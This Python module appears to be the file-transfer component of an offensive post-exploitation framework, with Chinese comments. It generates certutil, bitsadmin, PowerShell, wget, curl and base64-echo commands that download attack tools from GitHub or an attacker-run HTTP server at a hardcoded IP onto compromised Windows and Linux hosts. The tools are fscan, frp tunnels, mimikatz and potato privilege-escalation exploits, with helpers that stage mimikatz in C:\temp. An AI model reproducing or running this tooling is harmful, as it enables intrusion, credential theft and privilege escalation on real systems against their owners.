# remote_executor/file_transfer.py
"""
文件传输模块

提供多种文件传输方式:
- wget: HTTP下载 (Linux)
- curl: HTTP下载 (Linux/Windows)
- certutil: Windows下载
- powershell: Windows下载
- echo base64: 通用写入
- SFTP: SSH文件传输
"""
import os
import re
import base64
import time
import shutil
import subprocess
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class TransferResult:
    """传输结果"""
    success: bool
    local_path: str
    remote_path: str
    size: int = 0
    duration: float = 0.0
    error: str = ""


class FileTransfer:
    """
    文件传输管理器

    根据目标系统自动选择最佳传输方式
    """

    # 常用工具下载链接
    TOOL_URLS = {
        "fscan_linux": "https://github.com/shadow1ng/fscan/releases/download/v1.8.2/fscan",
        "fscan_windows": "https://github.com/shadow1ng/fscan/releases/download/v1.8.2/fscan.exe",
        "frpc_linux": "https://github.com/fatedier/frp/releases/download/v0.52.3/frp_0.52.3_linux_amd64.tar.gz",
        "frpc_windows": "https://github.com/fatedier/frp/releases/download/v0.52.3/frp_0.52.3_windows_amd64.zip",
        "mimikatz": "https://github.com/gentilkiwi/mimikatz/releases/download/v2.2.0-20220919/mimikatz_trunk.zip",
        "printspoofer": "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
        "sweetpotato": "https://github.com/CCob/SweetPotato/raw/master/SweetPotato/bin/Release/SweetPotato.exe",
    }

    def __init__(self, http_server: str = ""):
        """
        Args:
            http_server: HTTP服务器地址 (本机HTTP服务器)
                        框架运行在VPS上，工具由本机HTTP服务提供
                        如 "http://47.109.157.54:8000"
                        对应 config.HTTP_SERVER 属性
        """
        self.http_server = http_server

    # ==================== 上传命令生成 ====================

    def generate_upload_commands(
        self,
        file_url: str,
        remote_path: str,
        os_type: str = "linux"
    ) -> Dict[str, str]:
        """
        生成上传命令

        Args:
            file_url: 文件下载URL
            remote_path: 远程保存路径
            os_type: 操作系统类型

        Returns:
            各种上传方式的命令字典
        """
        commands = {}

        if os_type.lower() == "windows":
            commands["certutil"] = f"certutil -urlcache -split -f {file_url} {remote_path}"
            commands["powershell"] = f"powershell -c \"Invoke-WebRequest -Uri '{file_url}' -OutFile '{remote_path}'\""
            commands["bitsadmin"] = f"bitsadmin /transfer download /download /priority normal {file_url} {remote_path}"
            commands["curl"] = f"curl -o {remote_path} {file_url}"
        else:
            commands["wget"] = f"wget -O {remote_path} {file_url}"
            commands["curl"] = f"curl -o {remote_path} {file_url}"
            commands["fetch"] = f"fetch -o {remote_path} {file_url}"  # FreeBSD

        return commands

    def generate_base64_write_command(
        self,
        file_content: bytes,
        remote_path: str,
        os_type: str = "linux",
        chunk_size: int = 500
    ) -> List[str]:
        """
        生成base64写入命令 (分块写入大文件)

        Args:
            file_content: 文件内容
            remote_path: 远程路径
            os_type: 操作系统类型
            chunk_size: 每块大小

        Returns:
            命令列表
        """
        b64_content = base64.b64encode(file_content).decode()
        commands = []

        if os_type.lower() == "windows":
            # PowerShell方式
            commands.append(f"powershell -c \"[IO.File]::WriteAllBytes('{remote_path}', [Convert]::FromBase64String('{b64_content[:chunk_size]}'))\"")

            # 如果文件大，需要分块
            if len(b64_content) > chunk_size:
                # 这里简化处理，实际需要追加写入
                commands = [f"# 文件过大，建议使用HTTP下载方式"]
        else:
            # Linux方式
            if len(b64_content) <= chunk_size:
                commands.append(f"echo '{b64_content}' | base64 -d > {remote_path}")
            else:
                commands.append(f"# 分块写入大文件:")
                # 分块
                chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
                for i, chunk in enumerate(chunks):
                    if i == 0:
                        commands.append(f"echo '{chunk}' | base64 -d > {remote_path}")
                    else:
                        commands.append(f"echo '{chunk}' | base64 -d >> {remote_path}")

        return commands

    # ==================== 工具上传 ====================

    def upload_tool(
        self,
        tool_name: str,
        remote_path: str,
        os_type: str = "linux"
    ) -> Dict[str, str]:
        """
        生成上传工具的命令

        Args:
            tool_name: 工具名称
            remote_path: 远程保存路径
            os_type: 操作系统类型

        Returns:
            上传命令
        """
        # 确定工具URL
        tool_key = f"{tool_name.lower()}_{os_type.lower()}"
        if tool_key not in self.TOOL_URLS:
            tool_key = tool_name.lower()

        if tool_key not in self.TOOL_URLS:
            return {"error": f"未知工具: {tool_name}"}

        tool_url = self.TOOL_URLS[tool_key]

        # 如果有自定义HTTP服务器，替换URL
        if self.http_server:
            file_name = tool_url.split('/')[-1]
            tool_url = f"{self.http_server}/{file_name}"

        commands = self.generate_upload_commands(tool_url, remote_path, os_type)

        result = {
            "tool": tool_name,
            "url": tool_url,
            "remote_path": remote_path,
            "commands": commands,
            "quick_command": commands.get("wget") or commands.get("certutil", "")
        }

        # 添加执行权限命令
        if os_type.lower() == "linux":
            result["chmod_command"] = f"chmod +x {remote_path}"

        return result

    def upload_tools_batch(
        self,
        tools: List[str],
        remote_dir: str,
        os_type: str = "linux"
    ) -> List[Dict]:
        """
        批量上传工具

        Args:
            tools: 工具名称列表
            remote_dir: 远程目录
            os_type: 操作系统类型

        Returns:
            上传命令列表
        """
        results = []

        for tool in tools:
            remote_path = f"{remote_dir}/{tool}"
            result = self.upload_tool(tool, remote_path, os_type)
            results.append(result)

        return results

    # ==================== 常用工具快捷方法 ====================

    def upload_fscan(self, os_type: str = "linux", remote_dir: str = "/tmp") -> Dict:
        """上传fscan"""
        remote_path = f"{remote_dir}/fscan" if os_type == "linux" else f"{remote_dir}\\fscan.exe"
        return self.upload_tool("fscan", remote_path, os_type)

    def upload_frpc(self, os_type: str = "linux", remote_dir: str = "/tmp") -> Dict:
        """上传frpc"""
        remote_path = f"{remote_dir}/frpc" if os_type == "linux" else f"{remote_dir}\\frpc.exe"
        return self.upload_tool("frpc", remote_path, os_type)

    def upload_potato(self, potato_type: str = "printspoofer", remote_dir: str = "C:\\temp") -> Dict:
        """上传土豆提权工具"""
        remote_path = f"{remote_dir}\\{potato_type}.exe"
        return self.upload_tool(potato_type, remote_path, "windows")

    def upload_mimikatz(self, remote_dir: str = "C:\\temp") -> Dict:
        """上传mimikatz"""
        remote_path = f"{remote_dir}\\mimikatz.exe"
        return self.upload_tool("mimikatz", remote_path, "windows")

    # ==================== 文件下载 ====================

    def download_file_via_http(self, url: str, local_path: str) -> TransferResult:
        """通过HTTP下载文件"""
        start_time = time.time()

        try:
            import requests
            resp = requests.get(url, stream=True, timeout=60, verify=False)
            resp.raise_for_status()

            os.makedirs(os.path.dirname(local_path), exist_ok=True)

            with open(local_path, 'wb') as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)

            size = os.path.getsize(local_path)

            return TransferResult(
                success=True,
                local_path=local_path,
                remote_path=url,
                size=size,
                duration=time.time() - start_time
            )

        except Exception as e:
            return TransferResult(
                success=False,
                local_path=local_path,
                remote_path=url,
                error=str(e),
                duration=time.time() - start_time
            )


# ==================== 工具目录管理 ====================

def ensure_tools_directory():
    """确保工具目录存在 (返回镜像内置路径)"""
    # 工具在镜像中下载到 /opt/tools/，由Dockerfile管理
    return [
        "/opt/tools/potato",
        "/opt/tools/ad",
        "/opt/tools/linux",
        "/opt/tools/windows",
        "/opt/frp"
    ]


def list_available_tools() -> Dict[str, List[str]]:
    """列出可用的工具 (从镜像内置目录读取)"""
    tools = {
        "potato": [],
        "ad": [],
        "linux": [],
        "windows": [],
        "frp": []
    }

    base_dir = "/opt/tools"
    for category in ["potato", "ad", "linux", "windows"]:
        category_dir = os.path.join(base_dir, category)
        if os.path.exists(category_dir):
            for f in os.listdir(category_dir):
                tools[category].append(f)

    # frp 目录
    frp_dir = "/opt/frp"
    if os.path.exists(frp_dir):
        tools["frp"] = [f for f in os.listdir(frp_dir) if os.path.isfile(os.path.join(frp_dir, f))]

    return tools